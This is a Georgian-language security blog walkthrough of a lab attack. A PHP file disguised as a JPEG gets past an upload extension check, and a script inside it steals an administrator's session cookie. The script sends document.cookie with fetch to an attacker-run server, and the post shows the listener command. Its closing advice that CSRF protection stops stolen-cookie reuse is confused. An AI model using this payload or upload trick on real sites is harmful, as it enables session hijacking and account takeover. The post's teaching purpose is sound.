---
title: "მავნე PHP კოდი და XSS"
date: 2024-11-29 22:21:00 +0400
categories: [CyberSecurity,Hacking]
tags: [Web Exploitation]
---

## `PHP` vs `html`

ზოგადად, რა განსხვავებაა `PHP`-სა და `html`-ს შორის? ამ ორი ენის კოდი საკმაოდ ჰგავს ერთმანეთს. იდეაში, `PHP`-ს შეუძლია მთლიანი `html` კოდის ქონა მისივე ფაილში. მაგალითად:

```php
<?php
/* აქ კოდი */
?>

<html>
</html>

<?php
/* აქ კოდი */
?>
```

საქმე ისაა, რომ `PHP`-ს შეუძლია მისი ფუნქციონალი როგორც `Backend` სერვერად გამოიყენოს, ხოლო მიღებული `html` კოდი `Frontend`-ად.

ანუ, გამოდის, რომ ყველა ის ხაზი, რომელიც `<?php ?>` ტეგებშია მოქცეული, დარჩება სერვერის მხარეს, ხოლო სხვა დანარჩენი, კლიენტთან გაიგზავნება.

ამ ყველაფრის გამო, `PHP`-ში დაწერილი კოდი, საკმაოდ მოწყვლადი შეიძლება იყოს.

**ამ ბლოგში, განვიხილავ იმას, თუ როგორ შეიძლება ადმინისტრატორის `cookie`-ების მოპარვა სერვერზე მავნე `PHP` კოდის ატვირთვით**.

## ვამზადებ გარემოს

სცენარი რომ გავითამაშო, საჭიროა გარემოს ქონა. ამის გამო, `GNS3`-ში ავაწყე ვირტუალური ქსელი, სადაც იქნება შემტევი, კლიენტი(საიტის ადმინისტრატორი), `HTTP` სერვერი, რომელზეც საიტი დაიჰოსტება და ბოლოს როუტერი, რომელიც `DHCP` სერვერი იქნება და `IPv4` მისმართებს გასცემს შემტევზე და ადმინისტრატორზე.

![1.png](https://44b4c0.github.io/assets/img/posts/16/1.png)

ასეთი იქნება ქსელი. მოკლედ, კლიენტი `admin` ანგარიშით ექნება შესული სისტემაში და ჰაკერი მის მოპარვას შეძლებს.

საქმე ისაა, რომ საიტი მოწყვლადია და ჰაკერს შეუძლია ეს სათავისოდ გამოიყენოს.

![2.png](https://44b4c0.github.io/assets/img/posts/16/2.png)

მოცემულია ფაილი, რომელშიც `PHP` კონტენტია მოთავსებული, მაგრამ თავს ასაღებს, როგორც `JPEG/IMAGE` ფაილი. ეს გვერდს უვლის ე.წ. `file extension checking` ფუნქციას.

> **📰 საინტერესო ფაქტი:**
> 
> `file extension checking`-ის დროს, ვებ სერვერი ამოწმებს ფაილის დაბოლოებას(სუფიქსს). მაგალითად, შესაძლოა `Backend` ლოგიკაში ეწეროს, რომ მხოლოდ ის ფაილები უნდა მიიღოს სერვერმა `POST` ფორმით, რომელიც ბოლოვდება `.png`, `.jpeg` ან `.svg` სუფიქსებით. ამ მაგალითში, კი ფაილის სახელია `config.php.jpeg`, რაც `PHP` ფაილს `JPEG/IMAGE` ფაილად ასაღებს.

## შეტევის პროცესი

როდესაც ჰაკერი ფაილს სერვერზე ატვირთავს, ეს ფაილი სპეციალურ ფოლდერში(დირექტორიაში) განთავსდება. აქედან გამომდინარე, ჰაკერს შეუძლია აიღოს ლინკი, რომელიც ამ ფაილზე მიუთითებს და გაუგზავნოს საიტის ადმინისტრატორს. როდესაც ადმინისტრატორი გადავა ლინკზე, მისი ბრაუზერი გარკვეულ ქმედებებს შეასრულებს.

#### რა წერია `config.php.jpeg` ფაილში?

ახლა დროა ის კოდი განვიხილო, რაც ამ ფაილში ჩავწერე:

```php
<script>
const cookie = document.cookie;

fetch("http://10.1.1.5:8000/" + cookie);
</script>
```

თავდაპირველად, ბრაუზერის `cookie` ჩანაწერებს ვინახავ `cookie` კონსტენტში(ცვლადში) და შემდეგ ვიყენებ `fetch` ფუნქციას, რომელიც `GET` მოთხოვნით მიადგება `10.1.1.5`-ს(ჰაკერს) `8000/tcp` პორტზე, სადაც იქნება `PHP HTTP` სერვერი და ჰაკერი მიიღებს ადმინისტრატორის `cookie`-ებს.

![3.png](https://44b4c0.github.io/assets/img/posts/16/3.png)

აქ გარკვევით ჩანს, რომ ჰაკერი არ არის ადმინისტრატორი და `1337` მომხმარებლითაა შესული, რომელიც სტანდარტულ პრივილეგიებს ფლობს. ჰაკერს კი ადმინისტრატორის ანგარიშზე შესვლა სურს.

![4.png](https://44b4c0.github.io/assets/img/posts/16/4.png)

როგორც ჩანს, სერვერმა დაიჯერა, რომ ფაილი ვალიდურია და შეინახა მავნე `PHP` კოდი. ახლა, დროა ჰაკერმა `PHP HTTP` სერვერი ჩართოს და დაგენერირებული ლინკი ადმინისტრატორს გაუგზავნოს:

```php
php -S 0.0.0.0:8000
```
![5.png](https://44b4c0.github.io/assets/img/posts/16/5.png)

ეს არის ადმინისტრატორის `PHP Session Cookie`.

როდესაც ადმინისტრატორი მახეს წამოეგება და ლინკზე გადავა, ჰაკერი მიიღებს `Cookie` მნიშვნელობებს:

![6.png](https://44b4c0.github.io/assets/img/posts/16/6.png)

ამის შემდეგ, ჰაკერი შეცვლის `Cookie`-ებს თავისივე ბრაუზერში და გახდება ადმინისტრატორი:

![7.gif](https://44b4c0.github.io/assets/img/posts/16/7.gif)

## რა გამოვიდა?

საკმაოდ საინტერესოა იმის ნახვა, თუ რამდენ პრობლემას ქმნის საიტზე მავნე `PHP` კოდის ატვირთვის შესაძლებლობა. რა თქმა უნდა, აქედან ე.წ. `WebShell`-ის მიღებაც შეიძლება. საქმე ისაა, რომ ამ შემთხვევაში ჰაკერს არ სჭირდება სერვერზე სრული წვდომა. მას მხოლოდ ადმინისტრატორის ანგარიშზე სჭირდებოდა შესვლა.

ყველაზე საინტერესო აქ ისაა თუ როგორ მარტივად შეიძლება `HTTP` მოთხოვნის გაგზავნა `fetch` ფუნქციის გამოყენებით. ამის პრევენცია რომ მოხდეს, საჭიროა იმ ფაილების კარგად შემოწმება, რომლებსაც მომხმარებლები ტვირთავენ სერვერზე. ასევე საჭიროა ე.წ. `Zero Trust` პოლიტიკის გატარება, რაც ნიშნავს იმას, რომ არაფერია სანდო.

განსაკუთრებით, ბოლო, `GIF` ფაილი წარმოაჩენს იმ საშიშროებას, რასაც შეიძლება საიტის ადმინისტრატორები წააწყდნენ.

#### ფიშინგი მხოლოდ საკრედიტო ბარათებს არ იპარავს

მგონი, ამ ბლოგიდან გასაგებია, რომ ფიშინგის დროს შესაძლოა საკრედიტო ბარათების ინფორმაცია საერთოდ არ იყოს მნიშვნელოვანი და ყურადღება საერთოდ სხვა რამისკენ იყოს მიპყრობილი. ფაქტია, ჰაკერმა შეძლო და `GET` მოთხოვნით ადმინისტრატორისგან მიიღო მისი `Cookie`-ები.

## როგორ მუშაობს `PHPSESSID`, ანუ `PHP Session ID`?

ავთენტიფიკაციის ლოგიკა მარტივია. მომხმარებელს შეყავს მეილი/მეტსახელი და პაროლი, რომელსაც `Backend` სერვერი მიიღებს და მონაცემთა ბაზაში ჩანაწერებს გადაამოწმებს. თუ ყველაფერი ემთხვევა, სერვერი დააგენერირებს სესიის იდენტიფიკატორს და მომხმარებელს გაუგზავნის. ამის შემდეგ, სერვერი მომხმარებლისგან მიღებული ყოველი მოთხოვნის `Header`-ებიდან ამოიღებს ამ `cookie`-ს და მის ვალიდურობას შეამოწმებს.

აქ პრობლემა ისაა, რომ ვისაც ეს `cookie` ხელში ჩაუვარდება, ყველა შეძლებს ამ იდენტიფიკატორზე მიბმული ანგარიშიდან გარკვეული ქმედებების განხორციელებას. ამის გამო, საჭიროა `CSRF Protection` მექანიზმების ქონა სერვერზე.
